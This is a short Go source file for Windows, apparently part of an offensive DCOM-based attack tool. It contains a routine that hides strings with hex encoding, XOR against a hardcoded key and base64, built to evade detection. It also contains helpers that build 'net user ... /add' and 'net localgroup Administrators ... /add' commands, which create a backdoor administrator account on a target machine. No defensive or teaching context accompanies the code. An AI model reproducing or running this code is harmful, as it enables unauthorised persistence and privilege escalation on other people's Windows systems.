//go:build windows

package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
)

const xorKeyDcom = "dcom_poly_key_00"

var (
	obfCmdExe     = "cmd.exe"
	obfErrNeedAct = "[!] need -c, -H/-P, or -u/-pw"
)

func deobfDcom(h string) string {
	if h == "" {
		return ""
	}
	raw, err := hex.DecodeString(h)
	if err != nil {
		return h
	}
	key := []byte(xorKeyDcom)
	out := make([]byte, len(raw))
	for i := range raw {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	b, err := base64.StdEncoding.DecodeString(string(out))
	if err != nil {
		return string(out)
	}
	return string(b)
}

func obfCmdNetUserAdd(user, pass string) string {
	return fmt.Sprintf("net user %s %s /add", user, pass)
}

func obfCmdNetLocalgroupAdmins(user string) string {
	return fmt.Sprintf("net localgroup Administrators %s /add", user)
}
